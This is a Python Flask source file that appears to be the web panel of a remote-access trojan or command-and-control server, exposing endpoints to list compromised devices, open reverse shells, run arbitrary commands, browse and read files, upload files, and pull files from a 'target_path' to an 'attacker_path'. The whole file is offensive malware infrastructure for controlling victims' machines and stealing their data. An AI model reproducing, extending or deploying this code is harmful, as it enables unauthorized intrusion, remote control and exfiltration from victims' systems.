from Utils.libraries import Blueprint, render_template, request, jsonify
from Database import session as db_session, DeviceModel
from Web.Endpoints.authorization import authorized, admin
from Server.server_class import ServerClass

def devices_enpoints(server: ServerClass):
    devices_bp = Blueprint("devices", __name__, url_prefix="/devices")

    @devices_bp.route("/", methods=["GET"])
    @authorized
    def devices_index():
        use_json = request.args.get("json") == "true"
        devices: list[DeviceModel | None] = db_session.query(DeviceModel).all()
        if use_json:
            return jsonify([device.to_json(server) for device in devices])
        return render_template("devices/index.html", devices=devices)


    @devices_bp.route("/revshell", methods=["POST"])
    @authorized
    def revshell():
        id = request.form.get("id")
        address = request.form.get("address")
        port = request.form.get("port")
        try:
            server.get_active_handler(id).reverse_shell(address, port)
        except Exception as e:
            return jsonify({"status": "error", "message": "Couldn't open a Reverse Shell"})
        else:
            return jsonify({"status": "success", "message": "Reverse Shell Opened"})

    @devices_bp.route("/rce", methods=["POST"])
    @authorized
    def rce():
        id = request.form.get("id")
        cmd = request.form.get("cmd")
        try:
            output = server.get_device(id).rce(cmd)
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)})
        else:
            return jsonify({"status": "success", "message": output})

    @devices_bp.route("/infos", methods=["GET"])
    @authorized
    def infos():
        id = request.args.get("id")
        output = server.get_device(id).infos()
        try:
            output = server.get_device(id).infos()
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)})
        else:
            return jsonify({"status": "success", "message": output})

    @devices_bp.route("/dir", methods=["GET"])
    @authorized
    def dir():
        id = request.args.get("id")
        dir = request.args.get("dir")
        try:
            output = server.get_device(id).get_directory_contents(dir)
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)})
        else:
            return jsonify({"status": "success", "message": output})

    @devices_bp.route("/file", methods=["GET"])
    @authorized
    def file():
        id = request.args.get("id")
        path = request.args.get("path")
        try:
            output = server.get_device(int(id)).get_file_contents(path)
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)})
        else:
            return jsonify({"status": "success", "message": output})

    @devices_bp.route("/upload", methods=["POST"])
    @authorized
    def upload():
        id = request.form.get("id")
        fil = request.form.get("fil")
        path = request.form.get("path")
        try:
            output = server.get_device(id).file_upload(fil)
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)})
        else:
            return jsonify({"status": "success", "message": output})

    @devices_bp.route("/download", methods=["POST"])
    @authorized
    def download():
        id = request.form.get("id")
        target_path = request.form.get("target_path")
        attacker_path = request.form.get("attacker_path")
        try:
            output = server.file_download(
                id, target_path, attacker_path)
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)})
        else:
            return jsonify({"status": "success", "message": output})
    return devices_bp
